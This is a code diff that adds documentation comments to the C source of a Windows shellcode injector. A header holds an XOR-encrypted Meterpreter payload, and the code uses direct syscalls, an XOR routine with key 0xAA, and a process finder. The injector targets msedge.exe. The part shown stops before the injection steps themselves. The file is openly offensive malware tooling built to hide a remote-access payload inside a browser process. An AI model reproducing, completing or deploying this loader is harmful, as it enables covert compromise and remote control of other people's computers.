@@ -4,7 +4,7 @@
 #include <memoryapi.h>
 #include <tlhelp32.h>
 #include "syscalls.h"
-#include "buffer.h"
+#include "buffer.h" // Buffer containing the XORed Meterpreter payload
 
 #ifndef NT_SUCCESS
 #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
@@ -18,6 +18,7 @@
 #define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
 #endif
 
+// Define structure for system process information, used when querying system process information via native API functions
 typedef struct _SYSTEM_PROCESS_INFORMATION {
 	ULONG NextEntryOffset;
 	ULONG NumberOfThreads;
@@ -54,13 +55,33 @@ typedef struct _SYSTEM_PROCESS_INFORMATION {
 	LARGE_INTEGER OtherTransferCount;
 } SYSTEM_PROCESS_INFORMATION;
 
-// XORs each byte of the buffer with a given key
+/* 
+ * This function performs an XOR encryption/decryption on the input data.
+ *
+ * @param data: Pointer to the data to be encrypted/decrypted
+ * @param data_len: Length of the data
+ *
+ * The function XORs each byte of the input data with a fixed key (0xAA).
+ * This is a simple and symmetric encryption method, meaning the same 
+ * function can be used for both encryption and decryption.
+ */
 void XOR(unsigned char* data, size_t data_len) {
 	for (int i = 0; i < data_len; i++) {
 		data[i] = data[i] ^ 0xAA;
 	}
 }
 
+/*
+ * This function finds the process ID (PID) of a target process by its name.
+ *
+ * @param target_process: Name of the target process (Unicode string)
+ * 
+ * @return process ID of the target process if found, otherwise 0.
+ *
+ * The function takes a snapshot of all processes in the system and then
+ * iterates through them to find a process that matches the given name.
+ * If a matching process is found, its process ID is returned.
+ */
 int FindTarget(const wchar_t* target_process) {
 	PVOID buffer = NULL;
 	ULONG buffer_size = 0x10000;
@@ -95,6 +116,9 @@ int FindTarget(const wchar_t* target_process) {
 	return pid;
 }
 
+/*
+ * The entry point for the application. This function contains the main code for the shellcode injection.
+ */
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
 
 	const wchar_t *target_process = L"msedge.exe";
